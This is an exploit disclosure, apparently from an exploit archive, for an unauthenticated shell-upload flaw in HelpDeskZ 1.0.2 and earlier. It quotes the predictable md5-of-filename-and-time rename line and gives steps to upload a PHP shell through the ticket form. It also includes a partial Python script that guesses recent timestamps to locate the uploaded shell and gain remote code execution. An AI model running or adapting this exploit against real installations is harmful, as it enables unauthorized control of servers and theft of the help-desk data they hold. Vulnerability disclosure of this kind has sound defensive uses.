HelpDeskZ <= v1.0.2 suffers from an unauthenticated shell upload vulnerability.

The software in the default configuration allows upload for .php-Files ( ?!?! ). I think the developers thought it was no risk, because the filenames get "obfuscated" when they are uploaded. However, there is a weakness in the rename function of the uploaded file:

/controllers <https://github.com/evolutionscript/HelpDeskZ-1.0/tree/006662bb856e126a38f2bb76df44a2e4e3d37350/controllers>/*submit_ticket_controller.php - Line 141*
$filename = md5($_FILES['attachment']['name'].time()).".".$ext;

So by guessing the time the file was uploaded, we can get RCE.

Steps to reproduce:
http://localhost/helpdeskz/?v=submit_ticket&action=displayForm
Enter anything in the mandatory fields, attach your phpshell.php, solve the captcha and submit your ticket.
Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded:
exploit.py http://localhost/helpdeskz/ phpshell.php

currentTime = int(calendar.timegm(time.strptime(serverTime, timeFormat)))

#currentTime = int(time.time())

for x in range(0, 30):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"
